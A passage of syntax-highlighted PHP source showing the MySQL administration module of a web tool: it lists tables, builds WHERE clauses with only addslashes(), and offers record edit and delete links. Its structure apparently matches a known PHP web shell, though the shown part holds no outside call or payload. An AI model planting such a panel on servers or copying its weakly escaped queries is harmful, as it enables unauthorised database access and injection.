<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">where</span> .= $<span style="color: #f0c674;">tmp</span><span style="color: #cc6666; font-weight: bold;">.</span>$<span style="color: #f0c674;">key</span>.<span style="color: #8abeb7;">"='"</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">addslas</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">hes(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tmp</span> = <span style="color: #8abeb7;">' AND '</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#35835;&#21462;&#35760;&#24405;&#29992;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">mn</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">key</span>=&gt;$<span style="color: #f0c674;">inside</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">b1</span> .= <span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">html_clean(</span>$<span style="color: #f0c674;">ins</span><span style="color: #f0c674; text-decoration: underline;">ide</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">where</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">base64_encode(</span>$<span style="color: #f0c674;">where</span>);

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">allowedit</span>) <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td nowrap&gt;&lt;a href="j</span><span style="color: #8abeb7; text-decoration: underline;">avascript:editrecord(\'edit\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | &lt;a href="javascript:editrecord(\'del\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Del&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span>$<span style="color: #f0c674;">b1</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">unset(</span>$<span style="color: #f0c674;">b1</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">allowedit</span>) <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fieldnum</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_num_fields(</span>$<span style="color: #f0c674;">result</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>($<span style="color: #f0c674;">i</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;$<span style="color: #f0c674;">i</span>&lt;$<span style="color: #f0c674;">fieldnum</span>;$<span style="color: #f0c674;">i</span>++){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">name</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_field_name(</span>$<span style="color: #f0c674;">result</span>, $<span style="color: #f0c674;">i</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">type</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_field_type(</span>$<span style="color: #f0c674;">result</span>, $<span style="color: #f0c674;">i</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">len</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_field_len(</span>$<span style="color: #f0c674;">result</span>, $<span style="color: #f0c674;">i</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)</span><span style="color: #8abeb7; text-decoration: underline;">"</span><span style="text-decoration: underline;">.(($</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">tbfoot(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span>$<span style="color: #f0c674;">multipage</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">break</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">case</span> <span style="color: #81a2be;">2</span>:
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">ar</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_affected_rows(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;affected rows : &lt;b&gt;'</span>.$<span style="color: #f0c674;">ar</span>.<span style="color: #8abeb7;">'&lt;/b&gt;&lt;/h2&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">break</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">query</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"SHOW TABLE STATUS"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">table_num</span> = $<span style="color: #f0c674;">table_rows</span> = $<span style="color: #f0c674;">data_size</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tabledb</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>($<span style="color: #f0c674;">table</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_fetch_array(</span>$<span style="color: #f0c674;">query</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">data_size</span> = $<span style="color: #f0c674;">data_size</span> + $<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Data_length'</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">table_rows</span> = $<span style="color: #f0c674;">table_rows</span> + $<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Rows'</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Data_length'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">sizecount(</span>$<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Data_length'</span>]);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">table_num</span>++;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tabledb</span>[] = $<span style="color: #f0c674;">table</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">data_size</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">sizecount(</span>$<span style="color: #f0c674;">data_size</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">unset(</span>$<span style="color: #f0c674;">table</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;table border="0" cellpadding="0" cellspacing="0"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;form action="'</span>.$<span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="POST"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span>$<span style="color: #f0c674;">dbform</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td width="2%" align="center"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">highver</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> ($<span style="color: #f0c674;">tabledb</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">key</span> =&gt; $<span style="color: #f0c674;">table</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">thisbg</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>);
